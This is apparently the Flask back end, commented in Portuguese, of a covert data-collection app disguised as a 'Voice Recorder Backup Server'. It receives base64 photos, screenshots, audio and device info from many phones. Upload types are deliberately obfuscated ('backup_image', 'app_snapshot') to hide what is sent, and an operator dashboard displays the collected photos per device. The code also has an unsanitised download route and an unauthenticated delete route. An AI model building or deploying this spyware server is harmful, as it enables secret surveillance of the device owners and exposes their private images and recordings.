from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import base64
import json
from datetime import datetime
import threading

app = Flask(__name__)
CORS(app)  # Permitir acesso do app

# Configurações
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Contador de conexões
stats = {
    'total_requests': 0,
    'photos_received': 0,
    'audios_received': 0,
    'last_connection': None,
    'devices': set()
}

def save_stats():
    """Salvar estatísticas periodicamente"""
    with open('stats.json', 'w') as f:
        json.dump({
            **stats,
            'devices': list(stats['devices']),
            'last_connection': stats['last_connection'].isoformat() if stats['last_connection'] else None
        }, f, indent=2)

@app.route('/')
def home():
    """Página inicial do servidor"""
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Voice Recorder Backup Server</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
                color: white;
            }}
            .container {{ 
                max-width: 1000px; 
                margin: 0 auto;
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 30px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            }}
            h1 {{ 
                font-size: 2.5em; 
                margin-bottom: 20px; 
                text-align: center;
                background: linear-gradient(45deg, #fff, #f0f0f0);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }}
            .status {{ 
                background: rgba(255, 255, 255, 0.2);
                padding: 15px;
                border-radius: 10px;
                margin-bottom: 20px;
            }}
            .stat {{ 
                display: inline-block; 
                background: rgba(255, 255, 255, 0.3);
                padding: 10px 20px;
                margin: 5px;
                border-radius: 8px;
                font-weight: bold;
            }}
            .files-grid {{ 
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
                gap: 15px;
                margin-top: 20px;
            }}
            .file-card {{
                background: rgba(255, 255, 255, 0.15);
                padding: 15px;
                border-radius: 10px;
                transition: transform 0.3s;
            }}
            .file-card:hover {{
                transform: translateY(-5px);
                background: rgba(255, 255, 255, 0.25);
            }}
            .file-img {{
                width: 100%;
                border-radius: 5px;
                margin-bottom: 10px;
                max-height: 200px;
                object-fit: cover;
            }}
            .btn {{
                display: inline-block;
                background: #4CAF50;
                color: white;
                padding: 10px 20px;
                border-radius: 5px;
                text-decoration: none;
                margin: 5px;
                transition: background 0.3s;
            }}
            .btn:hover {{
                background: #45a049;
            }}
            .device-badge {{
                background: #FF9800;
                padding: 3px 8px;
                border-radius: 12px;
                font-size: 0.8em;
                margin-left: 5px;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎤 Voice Recorder Backup Server</h1>
            
            <div class="status">
                <h3>📊 Estatísticas do Sistema</h3>
                <div class="stat">📨 Total: {stats['total_requests']}</div>
                <div class="stat">📸 Fotos: {stats['photos_received']}</div>
                <div class="stat">🎤 Áudios: {stats['audios_received']}</div>
                <div class="stat">📱 Dispositivos: {len(stats['devices'])}</div>
                <div class="stat">🕒 Última conexão: {stats['last_connection'] or "Nenhuma"}</div>
            </div>
            
            <div style="margin: 20px 0;">
                <a href="/files" class="btn">📁 Ver Todos Arquivos</a>
                <a href="/stats" class="btn" style="background: #2196F3;">📈 Estatísticas Detalhadas</a>
                <a href="/clear" class="btn" style="background: #f44336;" 
                   onclick="return confirm('Tem certeza que deseja limpar todos os arquivos?')">
                   🗑️ Limpar Tudo
                </a>
            </div>
            
            <h3>🖼️ Últimas Fotos Recebidas</h3>
            <div id="photos" class="files-grid">
                <!-- Fotos serão carregadas aqui -->
            </div>
            
            <div style="margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.2); border-radius: 10px;">
                <h4>📡 Endpoints Disponíveis:</h4>
                <ul style="margin-left: 20px;">
                    <li><code>POST /upload</code> - Receber dados do app</li>
                    <li><code>GET /files</code> - Listar todos arquivos</li>
                    <li><code>GET /download/&lt;filename&gt;</code> - Baixar arquivo</li>
                    <li><code>GET /photos</code> - Apenas fotos</li>
                    <code>GET /audios</code> - Apenas áudios</li>
                </ul>
            </div>
        </div>
        
        <script>
            // Carregar últimas fotos
            fetch('/photos?limit=6')
                .then(r => r.json())
                .then(data => {
                    const container = document.getElementById('photos');
                    if (data.files.length === 0) {
                        container.innerHTML = '<p>Nenhuma foto recebida ainda.</p>';
                        return;
                    }
                    
                    data.files.forEach(file => {
                        container.innerHTML += `
                            <div class="file-card">
                                <img src="/download/${file.name}" class="file-img">
                                <div><strong>${file.device}</strong></div>
                                <div style="font-size: 0.9em;">${file.date}</div>
                                <a href="/download/${file.name}" class="btn" style="padding: 5px 10px; font-size: 0.8em;">
                                    ⬇️ Baixar
                                </a>
                            </div>
                        `;
                    });
                });
        </script>
    </body>
    </html>
    '''

@app.route('/upload', methods=['POST'])
def upload():
    """Receber dados do app"""
    try:
        stats['total_requests'] += 1
        stats['last_connection'] = datetime.now()
        
        data = request.json
        
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        # Tipo ofuscado (ex: "backup_image" em vez de "photo")
        obfuscated_type = data.get('type', 'unknown')
        device_id = data.get('device_id', 'unknown')
        timestamp = data.get('timestamp', int(datetime.now().timestamp() * 1000))
        
        # Adicionar dispositivo à lista
        stats['devices'].add(device_id)
        
        # Decodificar tipo real
        real_type = decode_type(obfuscated_type)
        
        # Criar nome do arquivo
        date = datetime.fromtimestamp(timestamp/1000)
        date_str = date.strftime('%Y%m%d_%H%M%S')
        filename = f"{real_type}_{device_id}_{date_str}"
        
        if real_type in ['photo', 'screenshot']:
            filename += '.jpg'
            filepath = os.path.join(UPLOAD_FOLDER, filename)
            
            if 'data' in data and data['data']:
                # Converter base64 para imagem
                try:
                    image_data = base64.b64decode(data['data'])
                    with open(filepath, 'wb') as f:
                        f.write(image_data)
                    
                    stats['photos_received'] += 1
                    print(f"✅ Foto recebida: {filename} ({len(image_data)} bytes)")
                    
                except Exception as e:
                    print(f"❌ Erro ao salvar foto: {e}")
                    return jsonify({'error': 'Invalid image data'}), 400
                    
        elif real_type == 'audio':
            filename += '.m4a'
            filepath = os.path.join(UPLOAD_FOLDER, filename)
            
            if 'data' in data and data['data'] and data['data'] != 'audio_placeholder':
                try:
                    audio_data = base64.b64decode(data['data'])
                    with open(filepath, 'wb') as f:
                        f.write(audio_data)
                    
                    stats['audios_received'] += 1
                    print(f"✅ Áudio recebido: {filename} ({len(audio_data)} bytes)")
                    
                except Exception as e:
                    print(f"❌ Erro ao salvar áudio: {e}")
                    # Salvar como placeholder
                    with open(filepath, 'w') as f:
                        f.write('audio_placeholder')
                    
                    stats['audios_received'] += 1
            else:
                # Salvar arquivo vazio para placeholder
                with open(filepath, 'w') as f:
                    f.write('audio_placeholder')
                
                stats['audios_received'] += 1
                
        else:
            # Dados gerais (JSON)
            filename += '.json'
            filepath = os.path.join(UPLOAD_FOLDER, filename)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            print(f"📊 Dados recebidos: {filename}")
        
        # Salvar estatísticas
        save_stats()
        
        return jsonify({
            'success': True,
            'message': 'File received successfully',
            'filename': filename,
            'received_at': datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"❌ Erro no upload: {e}")
        return jsonify({'error': str(e)}), 500

def decode_type(obfuscated: str) -> str:
    """Decodificar tipo ofuscado"""
    mapping = {
        'backup_image': 'photo',
        'backup_audio': 'audio',
        'device_info': 'data',
        'app_snapshot': 'screenshot'
    }
    return mapping.get(obfuscated, obfuscated)

@app.route('/files')
def list_files():
    """Listar todos arquivos"""
    try:
        files = []
        for f in sorted(os.listdir(UPLOAD_FOLDER), reverse=True):
            filepath = os.path.join(UPLOAD_FOLDER, f)
            if os.path.isfile(filepath):
                stats = os.stat(filepath)
                files.append({
                    'name': f,
                    'type': get_file_type(f),
                    'size': stats.st_size,
                    'date': datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                    'device': f.split('_')[1] if '_' in f else 'unknown'
                })
        
        return jsonify({'files': files[:100]})  # Últimos 100 arquivos
        
    except Exception as e:
        return jsonify({'files': [], 'error': str(e)})

@app.route('/photos')
def list_photos():
    """Listar apenas fotos"""
    try:
        files = []
        for f in sorted(os.listdir(UPLOAD_FOLDER), reverse=True):
            if f.endswith('.jpg'):
                filepath = os.path.join(UPLOAD_FOLDER, f)
                stats = os.stat(filepath)
                files.append({
                    'name': f,
                    'size': stats.st_size,
                    'date': datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                    'device': f.split('_')[1] if '_' in f else 'unknown'
                })
        
        limit = request.args.get('limit', type=int)
        if limit:
            files = files[:limit]
            
        return jsonify({'files': files})
        
    except Exception as e:
        return jsonify({'files': [], 'error': str(e)})

@app.route('/download/<filename>')
def download_file(filename):
    """Baixar arquivo específico"""
    try:
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.exists(filepath):
            return send_file(filepath, as_attachment=True)
        else:
            return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/stats')
def get_stats():
    """Estatísticas detalhadas"""
    try:
        return jsonify({
            **stats,
            'devices': list(stats['devices']),
            'last_connection': stats['last_connection'].isoformat() if stats['last_connection'] else None,
            'upload_folder_size': get_folder_size(UPLOAD_FOLDER)
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/clear')
def clear_files():
    """Limpar todos arquivos (apenas para desenvolvimento)"""
    try:
        for f in os.listdir(UPLOAD_FOLDER):
            filepath = os.path.join(UPLOAD_FOLDER, f)
            if os.path.isfile(filepath):
                os.remove(filepath)
        
        stats['total_requests'] = 0
        stats['photos_received'] = 0
        stats['audios_received'] = 0
        stats['devices'].clear()
        stats['last_connection'] = None
        
        save_stats()
        
        return jsonify({'success': True, 'message': 'All files cleared'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def get_folder_size(folder):
    """Calcular tamanho da pasta"""
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(folder):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            if os.path.exists(fp):
                total_size += os.path.getsize(fp)
    return total_size

def get_file_type(filename):
    """Determinar tipo do arquivo"""
    if filename.endswith('.jpg'):
        return 'photo'
    elif filename.endswith('.m4a'):
        return 'audio'
    elif filename.endswith('.json'):
        return 'data'
    else:
        return 'unknown'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    print(f"🚀 Servidor iniciando na porta {port}")
    print(f"📁 Pasta de uploads: {os.path.abspath(UPLOAD_FOLDER)}")
    print(f"🌐 Acesse: http://localhost:{port}")
    app.run(host='0.0.0.0', port=port, debug=False)
